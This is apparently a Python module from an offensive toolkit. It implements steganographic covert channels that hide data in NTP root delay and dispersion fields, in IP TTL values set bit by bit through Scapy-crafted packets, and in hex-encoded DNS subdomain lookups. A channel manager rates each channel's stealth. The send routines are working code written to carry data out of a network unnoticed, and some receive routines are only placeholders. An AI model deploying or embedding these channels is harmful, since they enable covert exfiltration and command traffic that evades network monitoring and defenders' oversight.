"""
Steganographic Channels - Hide data in network protocols
"""

import struct
import time
import socket
import asyncio
from typing import Dict, Optional
from abc import ABC, abstractmethod
import logging

# Import scapy for raw packet manipulation
try:
    from scapy.all import IP, UDP, Raw, send

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


logger = logging.getLogger(__name__)

if not SCAPY_AVAILABLE:
    logger.debug("Scapy not available; TTL channel will fall back to limited functionality.")


class SteganographicChannel(ABC):
    """Base class for steganographic channels."""

    @abstractmethod
    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data through steganographic channel."""
        pass

    @abstractmethod
    async def receive_data(self) -> Optional[bytes]:
        """Receive data from steganographic channel."""
        pass


class NTPChannel(SteganographicChannel):
    """Hide data in NTP packets."""

    def __init__(self):
        self.sock = None
        self.buffer = bytearray()

    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data hidden in NTP packet."""
        try:
            # Create NTP packet with hidden data
            ntp_packet = self._create_ntp_packet(data[:8])  # Max 8 bytes per packet

            # Send to NTP server (port 123)
            host, port = target.split(":") if ":" in target else (target, 123)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ntp_packet, (host, int(port)))
            sock.close()

            return True
        except Exception:
            return False

    async def receive_data(self) -> Optional[bytes]:
        """Extract data from NTP packet."""
        if len(self.buffer) >= 48:  # NTP packet size
            packet = bytes(self.buffer[:48])
            self.buffer = self.buffer[48:]
            return self._extract_from_ntp(packet)
        return None

    def _create_ntp_packet(self, hidden_data: bytes) -> bytes:
        """Create NTP packet with hidden data."""
        # Basic NTP packet structure
        packet = bytearray(48)

        # Set version (3), mode (3 - client)
        packet[0] = 0x1B

        # Hide data in precision and delay fields (unused in client requests)
        for i, byte in enumerate(hidden_data):
            if i < 4:
                packet[4 + i] = byte  # Root delay field
            elif i < 8:
                packet[8 + i - 4] = byte  # Root dispersion field

        # Set timestamp (current time)
        timestamp = int(time.time()) + 2208988800  # NTP epoch offset
        struct.pack_into(">I", packet, 40, timestamp)

        return bytes(packet)

    def _extract_from_ntp(self, packet: bytes) -> bytes:
        """Extract hidden data from NTP packet."""
        if len(packet) < 48:
            return b""

        # Extract from root delay and dispersion fields
        hidden_data = packet[4:8] + packet[8:12]
        return hidden_data.rstrip(b"\x00")


class TTLChannel(SteganographicChannel):
    """
    Hide data in IP TTL field using raw packet manipulation.

    Implemented functional TTL steganography with proper packet crafting
    using Scapy for raw socket operations as per Phase 2 requirements.
    """

    def __init__(self):
        self.received_bits = []
        self.normal_ttls = [64, 128, 255]  # Common TTL values
        self.encoding_base = 64  # Base TTL value for encoding

    async def send_data(self, data: bytes, target: str) -> bool:
        """
        Send data by modulating TTL values in IP packets.

        Uses raw packet crafting to embed data in TTL field.
        Each byte is split into bits and encoded as TTL variations.
        """
        if not SCAPY_AVAILABLE:
            # Fallback implementation without scapy
            return await self._send_data_fallback(data, target)

        try:
            # Convert data to bits
            bits = []
            for byte in data:
                bits.extend([(byte >> i) & 1 for i in range(8)])

            # Send packets with encoded TTL values
            for bit in bits:
                # Encode bit in TTL: base TTL + bit value
                ttl = self.encoding_base + bit

                # Create packet with custom TTL
                packet = IP(dst=target, ttl=ttl) / UDP(dport=53) / Raw(b"dns_query_dummy")

                # Send packet (may require root privileges)
                try:
                    send(packet, verbose=0)
                    await asyncio.sleep(0.1)  # Small delay between packets
                except Exception as e:
                    logger.debug("Could not send raw packet: %s", e)
                    return False

            return True

        except Exception as e:
            logger.error("Error in TTL channel send: %s", e)
            return False

    async def _send_data_fallback(self, data: bytes, target: str) -> bool:
        """
        Fallback implementation when scapy is not available.
        Uses socket options to set TTL (limited functionality).
        """
        try:
            for byte in data:
                # Extract bits from byte
                for i in range(8):
                    bit = (byte >> i) & 1
                    ttl = self.encoding_base + bit

                    # Create UDP socket with custom TTL
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
                        sock.sendto(b"steganographic_data", (target, 53))
                        await asyncio.sleep(0.1)
                    finally:
                        sock.close()

            return True

        except Exception as e:
            logger.error("Error in TTL fallback send: %s", e)
            return False

    async def receive_data(self) -> Optional[bytes]:
        """
        Extract data from received packets by analyzing TTL values.

        This would require packet capture capabilities in a real implementation.
        For now, returns a placeholder.
        """
        # In a real implementation, this would:
        # 1. Capture incoming packets
        # 2. Extract TTL values
        # 3. Decode bits from TTL variations
        # 4. Reconstruct original data

        # Placeholder implementation
        if len(self.received_bits) >= 8:
            # Convert bits to bytes
            byte_value = 0
            for i in range(8):
                if i < len(self.received_bits):
                    byte_value |= self.received_bits[i] << i

            self.received_bits = self.received_bits[8:]
            return bytes([byte_value])

        return None

    def _extract_bit_from_ttl(self, ttl: int) -> Optional[int]:
        """Extract hidden bit from TTL value."""
        if ttl >= self.encoding_base and ttl <= self.encoding_base + 1:
            return ttl - self.encoding_base
        return None


class DNSChannel(SteganographicChannel):
    """Hide data in DNS queries."""

    def __init__(self):
        self.domain_base = "example.com"

    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data in DNS subdomain."""
        try:
            # Encode data as hex and create subdomain
            hex_data = data.hex()
            subdomain = f"{hex_data}.{self.domain_base}"

            # Perform DNS lookup (this sends the data)
            try:
                socket.gethostbyname(subdomain)
            except socket.gaierror:
                pass  # Expected for non-existent domains

            return True
        except Exception:
            return False

    async def receive_data(self) -> Optional[bytes]:
        """Extract data from DNS query logs."""
        # This would require access to DNS server logs
        # Simplified implementation
        return None


class ChannelManager:
    """Manage multiple steganographic channels."""

    def __init__(self):
        self.channels = {"ntp": NTPChannel(), "ttl": TTLChannel(), "dns": DNSChannel()}
        self.active_channel = "ntp"

    async def send_data(self, data: bytes, target: str, channel: Optional[str] = None) -> bool:
        """Send data through specified or active channel."""
        channel_name = channel or self.active_channel

        if channel_name not in self.channels:
            return False

        return await self.channels[channel_name].send_data(data, target)

    async def receive_data(self, channel: Optional[str] = None) -> Optional[bytes]:
        """Receive data from specified or active channel."""
        channel_name = channel or self.active_channel

        if channel_name not in self.channels:
            return None

        return await self.channels[channel_name].receive_data()

    def switch_channel(self, channel: str):
        """Switch active channel."""
        if channel in self.channels:
            self.active_channel = channel

    def get_channel_info(self) -> Dict[str, Dict]:
        """Get information about available channels."""
        return {
            "ntp": {"capacity": "8 bytes/packet", "stealth": "high", "bandwidth": "low"},
            "ttl": {"capacity": "1 bit/packet", "stealth": "very high", "bandwidth": "very low"},
            "dns": {"capacity": "variable", "stealth": "medium", "bandwidth": "medium"},
        }
